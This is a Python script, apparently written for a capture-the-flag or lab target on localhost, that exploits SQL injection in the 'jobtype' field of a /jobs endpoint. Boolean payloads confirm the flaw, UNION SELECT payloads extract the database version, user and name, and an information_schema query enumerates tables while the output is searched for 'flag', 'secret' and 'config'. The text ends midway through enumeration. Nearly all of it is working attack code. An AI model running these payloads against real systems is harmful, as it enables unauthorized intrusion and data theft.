import requests
import json
import re
import time

BASE_URL = "http://127.0.0.1:8000"
ENDPOINT = "/jobs"
TARGET_URL = BASE_URL + ENDPOINT

print("[+] Target URL:", TARGET_URL)
print("[+] Testing SQL injection via 'jobtype' parameter")
print()

# Test different payloads to confirm vulnerability
basic_confirm_payloads = [
    "test' OR 1=1-- ",
    "test' OR '1'='1",
]

print("=" * 50)
print("CONFIRMING VULNERABILITY")
print("=" * 50)

for payload in basic_confirm_payloads:
    print(f"\n[+] Testing payload: {payload}")
    
    try:
        headers = {'Content-Type': 'application/json'}
        data = {"jobtype": payload}
        
        response = requests.post(TARGET_URL, 
                               headers=headers, 
                               data=json.dumps(data),
                               timeout=15)
        
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Length: {len(response.text)} bytes")
        
        # Print response (limit to first 1000 chars to avoid noise)
        response_text = response.text
        if len(response_text) > 1000:
            print(f"[+] Response: {response_text[:1000]}...")
        else:
            print(f"[+] Response: {response_text}")
        
        # Check for error messages that might reveal structure
        if "error" in response_text.lower():
            print(f"[!] Error in response: {response_text}")
        
        time.sleep(1)
        
    except Exception as e:
        print(f"[!] Request failed: {e}")

print("\n" + "=" * 50)
print("EXTRACTING DATABASE INFO")
print("=" * 50)

# Try to extract database version, user, name
info_payloads = {
    "Database Version": "test' UNION SELECT @@version, 'a', 'b', 'c', 'd'-- ",
    "Database User": "test' UNION SELECT user(), 'a', 'b', 'c', 'd'-- ",
    "Database Name": "test' UNION SELECT database(), 'a', 'b', 'c', 'd'-- "
}

for name, payload in info_payloads.items():
    print(f"\n[+] Extracting {name}...")
    print(f"[+] Payload: {payload}")
    
    try:
        headers = {'Content-Type': 'application/json'}
        data = {"jobtype": payload}
        
        response = requests.post(TARGET_URL,
                               headers=headers,
                               data=json.dumps(data),
                               timeout=15)
        
        print(f"[+] Status: {response.status_code}")
        
        if response.status_code == 200:
            response_text = response.text
            
            # Try to extract the injected data
            if "a" in response_text and "b" in response_text:
                # Look for data between patterns
                patterns = ["test", "a", "b", "c", "d"]
                for pattern in patterns:
                    if pattern in response_text:
                        print(f"[+] Found pattern '{pattern}' in response")
                
                print(f"[+] Response: {response_text[:500]}")
                
                # Try to find version info
                if name == "Database Version":
                    version_match = re.search(r'(\d+\.\d+\.\d+)', response_text)
                    if version_match:
                        print(f"[+] Database Version: {version_match.group(1)}")
                
                # Try to find user info
                if name == "Database User":
                    user_match = re.search(r'(\w+@\w+|root|admin|mysql)', response_text)
                    if user_match:
                        print(f"[+] Database User: {user_match.group(1)}")
                        
        time.sleep(1)
        
    except Exception as e:
        print(f"[!] Request failed: {e}")

print("\n" + "=" * 50)
print("ENUMERATING TABLES")
print("=" * 50)

# Try to get table names
tables_payload = "test' UNION SELECT table_name, 'a', 'b', 'c', 'd' FROM information_schema.tables WHERE table_schema=database()-- "

print(f"[+] Payload: {tables_payload}")

try:
    headers = {'Content-Type': 'application/json'}
    data = {"jobtype": tables_payload}
    
    response = requests.post(TARGET_URL,
                           headers=headers,
                           data=json.dumps(data),
                           timeout=15)
    
    print(f"[+] Status: {response.status_code}")
    
    if response.status_code == 200:
        response_text = response.text
        print(f"[+] Response: {response_text[:800]}")
        
        # Extract potential table names
        if "flag" in response_text.lower():
            print("[!] Found 'flag' reference in response!")
        if "secret" in response_text.lower():
            print("[!] Found 'secret' reference in response!")
        if "config" in response_text.lower():
            print("[!] Found 'config' reference in response!")
            
